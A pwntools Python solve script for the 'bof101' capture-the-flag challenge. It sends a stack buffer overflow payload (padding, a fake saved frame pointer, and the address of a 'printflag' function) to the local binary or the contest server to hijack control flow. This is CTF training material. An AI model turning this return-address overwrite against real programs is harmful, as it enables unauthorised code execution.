#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bof101")


def start(argv=[], *a, **kw):
    # nc bof101.sstf.site 1337
    host = args.HOST or 'bof101.sstf.site'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x8c
win = elf.symbols["printflag"]

payload = b"A" * pad
payload += p32(0xdeadbeef)
payload += p64(elf.bss(0x200))
payload += p64(win)

io.sendlineafter(b": ", payload)

io.interactive()
